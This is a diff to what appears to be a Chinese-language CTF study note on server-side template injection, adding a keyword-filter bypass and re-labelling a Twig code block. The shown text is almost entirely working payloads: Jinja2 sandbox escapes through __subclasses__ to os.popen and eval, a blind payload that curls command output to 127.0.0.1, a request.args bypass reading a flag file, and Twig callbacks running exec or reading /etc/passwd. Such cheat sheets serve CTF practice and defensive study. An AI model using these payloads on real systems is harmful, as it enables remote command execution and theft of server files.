@@ -925,7 +925,7 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
         # popen('id')中的id可换成其他Linux命令
         [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
         #eval,impoer等全局函数
-        [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
+        #[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ 下有eval，__import__等的全局函数，可以利用此来执行命令：
         [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
         [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
         [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
@@ -976,10 +976,16 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
         {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
     ```
 
+    过滤class,subclass等关键字:可以用request.args绕过
+
+    ```python
+    [request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()?a=__class__&b=__mro__&c=__subclasses__&d=read
+    ```
+
     Twig
 
-    ```Twig
-        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}//其中id可以更换为系统命令
+    ```python
+        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} # 其中id可以更换为系统命令
         {{'/etc/passwd'|file_excerpt(1,30)}}
 
         {{app.request.files.get(1).__construct('/etc/passwd','')}}
